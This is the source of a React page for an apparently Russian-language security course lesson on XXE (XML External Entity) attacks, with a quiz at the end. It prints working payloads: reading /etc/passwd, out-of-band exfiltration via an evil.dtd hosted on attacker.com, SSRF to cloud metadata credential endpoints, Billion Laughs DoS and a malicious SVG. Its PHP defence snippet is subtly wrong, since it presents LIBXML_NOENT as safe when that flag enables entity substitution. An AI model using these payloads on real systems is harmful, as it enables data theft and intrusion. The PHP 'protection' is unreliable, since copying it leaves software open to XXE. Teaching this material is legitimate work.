'use client';

import React from 'react';
import { ContentPageLayout } from '@/components/content/ContentPageLayout';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { ExternalLink, AlertTriangle, FileCode } from 'lucide-react';
import { QuizItem } from '@/components/content/QuizItem';

const P: React.FC<React.HTMLAttributes<HTMLParagraphElement>> = ({ children, ...props }) => (
  <p className="mb-3 leading-relaxed" {...props}>{children}</p>
);

const H2: React.FC<React.HTMLAttributes<HTMLHeadingElement>> = ({ children, ...props }) => (
  <h2 className="text-2xl font-bold mb-4 mt-6" {...props}>{children}</h2>
);

const H3: React.FC<React.HTMLAttributes<HTMLHeadingElement>> = ({ children, ...props }) => (
  <h3 className="text-xl font-semibold mb-3 mt-4" {...props}>{children}</h3>
);

export default function Lesson6Page() {
  const quizQuestions = [
    {
      question: "Что такое XXE (XML External Entity)?",
      answers: [
        "Уязвимость, позволяющая внедрять SQL-код",
        "Уязвимость, позволяющая обрабатывать внешние сущности в XML",
        "Уязвимость в JavaScript",
        "Уязвимость в CSS"
      ],
      correctAnswerIndex: 1
    },
    {
      question: "Какой тип XXE используется, когда приложение не возвращает результаты?",
      answers: [
        "In-band XXE",
        "Classic XXE",
        "Blind XXE",
        "Direct XXE"
      ],
      correctAnswerIndex: 2
    },
    {
      question: "Что можно сделать с помощью XXE атаки?",
      answers: [
        "Читать файлы на сервере",
        "Выполнять SSRF атаки",
        "Проводить DoS атаки",
        "Все перечисленное"
      ],
      correctAnswerIndex: 3
    },
    {
      question: "Какой метод НЕ является защитой от XXE?",
      answers: [
        "Отключение обработки внешних сущностей",
        "Использование простых форматов данных вместо XML",
        "Включение XSS фильтров",
        "Обновление XML парсеров"
      ],
      correctAnswerIndex: 2
    },
    {
      question: "Какой протокол может быть использован для чтения локальных файлов в XXE?",
      answers: [
        "file://",
        "http://",
        "ftp://",
        "Все перечисленные"
      ],
      correctAnswerIndex: 3
    }
  ];

  return (
    <ContentPageLayout
      title="Урок 6: XXE (XML External Entity)"
      subtitle="Изучение атак XXE, методов эксплуатации и защиты от уязвимостей XML"
    >
      <div className="space-y-6">
        <Card className="border-destructive/50 bg-destructive/5">
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <AlertTriangle className="h-5 w-5 text-destructive" />
              Важное предупреждение
            </CardTitle>
          </CardHeader>
          <CardContent>
            <P>
              XXE (XML External Entity) — серьезная уязвимость, которая может привести к раскрытию конфиденциальных 
              данных, SSRF атакам, отказу в обслуживании и даже выполнению удаленного кода. Все примеры предназначены 
              только для образовательных целей в контролируемых средах.
            </P>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <FileCode className="h-6 w-6" />
              Что такое XXE?
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <P>
              <strong>XXE (XML External Entity injection)</strong> — это уязвимость безопасности веб-приложений, 
              которая позволяет злоумышленнику вмешиваться в обработку XML-данных приложением. Это часто позволяет 
              просматривать файлы в файловой системе сервера приложений и взаимодействовать с любыми внутренними 
              или внешними системами, к которым само приложение может получить доступ.
            </P>
            <P>
              XXE атаки используют особенность XML — возможность определять внешние сущности (external entities), 
              которые могут ссылаться на внешние источники данных через URI.
            </P>
            <P>
              <strong>Потенциальные последствия XXE атак:</strong>
            </P>
            <ul className="list-disc pl-6 mb-3 space-y-1">
              <li>Чтение произвольных файлов на сервере</li>
              <li>SSRF (Server-Side Request Forgery) атаки</li>
              <li>Сканирование портов внутренней сети</li>
              <li>Отказ в обслуживании (DoS)</li>
              <li>В редких случаях — выполнение удаленного кода (RCE)</li>
            </ul>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Основы XML и External Entities</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <H3>Что такое XML Entity?</H3>
            <P>
              XML entity — это способ представления данных в XML документе. Существует несколько типов сущностей:
            </P>
            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
              <pre className="text-sm">
{`<!-- Internal Entity (Внутренняя сущность) -->
<!DOCTYPE foo [
  <!ENTITY myentity "my entity value">
]>
<root>
  <element>&myentity;</element>
</root>
<!-- Результат: <element>my entity value</element> -->

<!-- External Entity (Внешняя сущность) -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <element>&xxe;</element>
</root>
<!-- Результат: содержимое файла /etc/passwd -->`}
              </pre>
            </div>

            <H3>Document Type Definition (DTD)</H3>
            <P>
              DTD определяет структуру XML документа. Именно в DTD объявляются entities:
            </P>
            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
              <pre className="text-sm">
{`<!DOCTYPE название [
  <!ELEMENT название (тип)>
  <!ENTITY имя "значение">
]>

<!-- Пример уязвимого XML -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>`}
              </pre>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Типы XXE атак</CardTitle>
          </CardHeader>
          <CardContent className="space-y-6">
            <div>
              <H2>1. Classic XXE (Чтение файлов)</H2>
              <P>
                Самый простой тип XXE, где содержимое внешней сущности возвращается в ответе приложения.
              </P>
              <H3>Пример атаки</H3>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`<!-- Оригинальный запрос -->
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>381</productId>
  <storeId>29</storeId>
</stockCheck>

<!-- XXE атака -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>29</storeId>
</stockCheck>

<!-- Чтение файлов Windows -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>

<!-- Чтение произвольных файлов -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
]>`}
                </pre>
              </div>

              <H3>Чтение файлов через PHP wrapper</H3>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>

<!-- Результат будет закодирован в base64, что позволяет читать бинарные файлы -->`}
                </pre>
              </div>
            </div>

            <div>
              <H2>2. Blind XXE</H2>
              <P>
                <strong>Blind XXE</strong> возникает, когда приложение уязвимо к XXE, но не возвращает значения 
                внешних сущностей в своих ответах.
              </P>

              <H3>2.1 Blind XXE через Out-of-band (OAST)</H3>
              <P>Использование внешнего сервера для получения данных:</P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`<!-- Базовое обнаружение через DNS -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<root>
  <data>&xxe;</data>
</root>

<!-- Злоумышленник увидит запрос к attacker.com, подтверждающий уязвимость -->

<!-- Извлечение данных через DNS -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>

<!-- Файл evil.dtd на attacker.com: -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;`}
                </pre>
              </div>

              <H3>2.2 Blind XXE через Error Messages</H3>
              <P>Вызов ошибки парсинга, которая содержит желаемые данные:</P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>

<!-- Ошибка парсера может содержать содержимое /etc/passwd -->`}
                </pre>
              </div>
            </div>

            <div>
              <H2>3. XXE для SSRF</H2>
              <P>
                XXE можно использовать для выполнения Server-Side Request Forgery атак:
              </P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`<!-- Сканирование внутренних портов -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:22">
]>
<root>&xxe;</root>

<!-- Доступ к метаданным облачных сервисов -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>

<!-- AWS metadata -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">

<!-- Google Cloud metadata -->
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">

<!-- Azure metadata -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">`}
                </pre>
              </div>
            </div>

            <div>
              <H2>4. XXE для DoS</H2>
              <P>
                <strong>Billion Laughs Attack</strong> — классическая DoS атака через XXE:
              </P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>

<!-- Эта атака расширяется до ~3 миллиардов "lol" и вызывает истощение памяти -->`}
                </pre>
              </div>
            </div>

            <div>
              <H2>5. XInclude атаки</H2>
              <P>
                Когда невозможно модифицировать DOCTYPE, можно использовать XInclude:
              </P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>`}
                </pre>
              </div>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Обнаружение XXE</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <H3>1. Обнаружение через внешние сущности</H3>
            <P>Самый простой способ — попытаться определить внешнюю сущность:</P>
            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
              <pre className="text-sm">
{`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://your-server.com/xxe-test">]>
<root>&xxe;</root>

<!-- Если приложение уязвимо, вы получите HTTP запрос на your-server.com -->`}
              </pre>
            </div>

            <H3>2. Использование Burp Collaborator</H3>
            <P>Burp Suite предоставляет встроенный Collaborator сервер:</P>
            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
              <pre className="text-sm">
{`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://burp-collaborator-subdomain.burpcollaborator.net">]>
<root>&xxe;</root>

<!-- Проверьте Burp Collaborator на наличие входящих запросов -->`}
              </pre>
            </div>

            <H3>3. Проверка различных Content-Type</H3>
            <P>Попробуйте изменить Content-Type на:</P>
            <ul className="list-disc pl-6 mb-3 space-y-1">
              <li><code className="bg-muted px-1 py-0.5 rounded">application/xml</code></li>
              <li><code className="bg-muted px-1 py-0.5 rounded">text/xml</code></li>
              <li><code className="bg-muted px-1 py-0.5 rounded">application/x-www-form-urlencoded</code> (можно преобразовать в XML)</li>
            </ul>

            <H3>4. Тестирование file upload</H3>
            <P>Загрузка SVG, DOCX, XLSX файлов (они содержат XML):</P>
            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
              <pre className="text-sm">
{`<!-- malicious.svg -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>`}
              </pre>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Методы защиты от XXE</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div>
              <H3>1. Отключение внешних сущностей (Наиболее эффективно)</H3>
              <P>Отключите обработку внешних сущностей в XML парсере:</P>

              <div className="mb-4">
                <p className="font-semibold mb-2">PHP (libxml)</p>
                <div className="bg-muted p-4 rounded-md overflow-x-auto">
                  <pre className="text-sm">
{`// Отключить загрузку внешних сущностей
libxml_disable_entity_loader(true);

// Использовать флаги при загрузке
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);

// Лучший вариант - использовать SimpleXML безопасно:
$xml = simplexml_load_string($data, 'SimpleXMLElement', LIBXML_NOENT);`}
                  </pre>
                </div>
              </div>

              <div className="mb-4">
                <p className="font-semibold mb-2">Java (DocumentBuilderFactory)</p>
                <div className="bg-muted p-4 rounded-md overflow-x-auto">
                  <pre className="text-sm">
{`DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// Отключить DTDs полностью
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// Если нельзя отключить DTDs полностью:
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

// Отключить XInclude
dbf.setXIncludeAware(false);

// Отключить expansion of entity references
dbf.setExpandEntityReferences(false);`}
                  </pre>
                </div>
              </div>

              <div className="mb-4">
                <p className="font-semibold mb-2">Python (lxml)</p>
                <div className="bg-muted p-4 rounded-md overflow-x-auto">
                  <pre className="text-sm">
{`from lxml import etree

# Безопасный парсер
parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    dtd_validation=False,
    load_dtd=False
)

doc = etree.fromstring(xml_data, parser)

# Или используйте defusedxml:
import defusedxml.ElementTree as ET
tree = ET.parse('data.xml')`}
                  </pre>
                </div>
              </div>

              <div className="mb-4">
                <p className="font-semibold mb-2">Node.js (libxmljs)</p>
                <div className="bg-muted p-4 rounded-md overflow-x-auto">
                  <pre className="text-sm">
{`const libxmljs = require("libxmljs");

// Безопасный парсинг
const xmlDoc = libxmljs.parseXml(xmlString, {
    noent: false,
    nonet: true,
    dtdload: false,
    dtdvalid: false
});`}
                  </pre>
                </div>
              </div>

              <div className="mb-4">
                <p className="font-semibold mb-2">.NET</p>
                <div className="bg-muted p-4 rounded-md overflow-x-auto">
                  <pre className="text-sm">
{`XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;

using (XmlReader reader = XmlReader.Create(stream, settings))
{
    XmlDocument doc = new XmlDocument();
    doc.Load(reader);
}`}
                  </pre>
                </div>
              </div>
            </div>

            <div>
              <H3>2. Использование менее сложных форматов данных</H3>
              <P>Везде, где возможно, используйте более простые форматы:</P>
              <ul className="list-disc pl-6 mb-3 space-y-1">
                <li>JSON вместо XML</li>
                <li>YAML (с осторожностью)</li>
                <li>CSV для простых данных</li>
              </ul>
            </div>

            <div>
              <H3>3. Валидация входных данных</H3>
              <ul className="list-disc pl-6 mb-3 space-y-1">
                <li>Валидация XML против XSD (XML Schema)</li>
                <li>Белый список разрешенных элементов и атрибутов</li>
                <li>Проверка на наличие DOCTYPE в XML</li>
              </ul>
            </div>

            <div>
              <H3>4. Обновление зависимостей</H3>
              <ul className="list-disc pl-6 mb-3 space-y-1">
                <li>Регулярно обновляйте XML парсеры</li>
                <li>Используйте зависимости с известными безопасными настройками</li>
                <li>Мониторьте CVE для используемых библиотек</li>
              </ul>
            </div>

            <div>
              <H3>5. Web Application Firewall (WAF)</H3>
              <P>Настройте WAF для обнаружения XXE паттернов:</P>
              <ul className="list-disc pl-6 mb-3 space-y-1">
                <li>Блокировка DOCTYPE declarations</li>
                <li>Блокировка ENTITY declarations</li>
                <li>Блокировка file:// и http:// в XML</li>
              </ul>
            </div>

            <div>
              <H3>6. Принцип наименьших привилегий</H3>
              <ul className="list-disc pl-6 mb-3 space-y-1">
                <li>Запускайте приложение под пользователем с минимальными правами</li>
                <li>Ограничьте доступ к файловой системе</li>
                <li>Ограничьте исходящие соединения</li>
              </ul>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Практические лаборатории</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <P>
              Рекомендуемые платформы для практики XXE:
            </P>
            <ul className="list-disc pl-6 space-y-2">
              <li>
                <strong>PortSwigger Web Security Academy - XXE</strong>
                <a 
                  href="https://portswigger.net/web-security/xxe" 
                  target="_blank" 
                  rel="noopener noreferrer"
                  className="inline-flex items-center ml-2 text-primary hover:underline"
                >
                  Перейти к лабораториям <ExternalLink className="ml-1 h-4 w-4" />
                </a>
                <div className="ml-4 mt-2 text-sm text-muted-foreground">
                  Рекомендуемые лабораторные работы:
                  <ol className="list-decimal pl-6 mt-2 space-y-1">
                    <li>Exploiting XXE using external entities to retrieve files</li>
                    <li>Exploiting XXE to perform SSRF attacks</li>
                    <li>Blind XXE with out-of-band interaction</li>
                    <li>Blind XXE with out-of-band interaction via XML parameter entities</li>
                    <li>Exploiting blind XXE to exfiltrate data using a malicious external DTD</li>
                  </ol>
                </div>
              </li>
              <li><strong>DVWA (Damn Vulnerable Web Application)</strong> - XXE модуль</li>
              <li><strong>WebGoat</strong> - XXE lessons</li>
              <li><strong>HackTheBox</strong> - Machines с XXE уязвимостями</li>
              <li><strong>TryHackMe</strong> - XXE комнаты</li>
            </ul>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Инструменты для тестирования XXE</CardTitle>
          </CardHeader>
          <CardContent>
            <ul className="list-disc pl-6 space-y-2">
              <li><strong>Burp Suite Professional</strong> - Burp Collaborator для out-of-band тестирования</li>
              <li><strong>OWASP ZAP</strong> - Автоматическое сканирование XXE</li>
              <li><strong>XXEinjector</strong> - Специализированный инструмент для XXE</li>
              <li><strong>Interactsh</strong> - Open-source альтернатива Burp Collaborator</li>
              <li><strong>RequestBin / Webhook.site</strong> - Для захвата out-of-band запросов</li>
            </ul>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Проверка знаний</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-6">
              {quizQuestions.map((q, index) => (
                <QuizItem
                  key={index}
                  question={q.question}
                  answers={q.answers}
                  correctAnswerIndex={q.correctAnswerIndex}
                />
              ))}
            </div>
          </CardContent>
        </Card>

        <Card className="bg-primary/5 border-primary/20">
          <CardHeader>
            <CardTitle>Заключение</CardTitle>
          </CardHeader>
          <CardContent>
            <P>
              XXE (XML External Entity) — серьезная уязвимость, которая может привести к раскрытию конфиденциальных 
              данных, SSRF атакам и другим серьезным последствиям. <strong>Лучшая защита — полностью отключить 
              обработку внешних сущностей</strong> в XML парсере.
            </P>
            <P>
              Если ваше приложение обрабатывает XML, убедитесь, что вы используете безопасную конфигурацию парсера. 
              Везде, где возможно, рассмотрите использование более простых форматов данных, таких как JSON.
            </P>
            <P>
              <strong>Помните:</strong> Всегда применяйте принцип defense in depth и регулярно обновляйте 
              зависимости!
            </P>
          </CardContent>
        </Card>
      </div>
    </ContentPageLayout>
  );
}
